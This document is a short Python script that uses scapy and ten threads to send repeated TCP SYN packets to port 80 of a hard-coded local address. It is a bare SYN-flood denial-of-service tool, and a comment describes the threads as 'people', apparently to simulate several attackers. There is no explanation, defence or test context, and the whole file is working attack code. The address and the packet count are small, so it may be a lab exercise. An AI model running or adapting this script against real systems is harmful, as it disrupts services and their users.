from scapy.all import *
import threading


# Define target IP and port
target_ip = "127.20.10.11"
target_port = 80

# Number of threads (representing "people")
num_threads = 10

# Number of packets to send per thread
packets_per_thread = 100

def send_packets():
    # Craft TCP SYN packet
    syn_packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
    
    # Send packets
    for _ in range(packets_per_thread):
        send(syn_packet)

# Create and start threads
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_packets)
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()
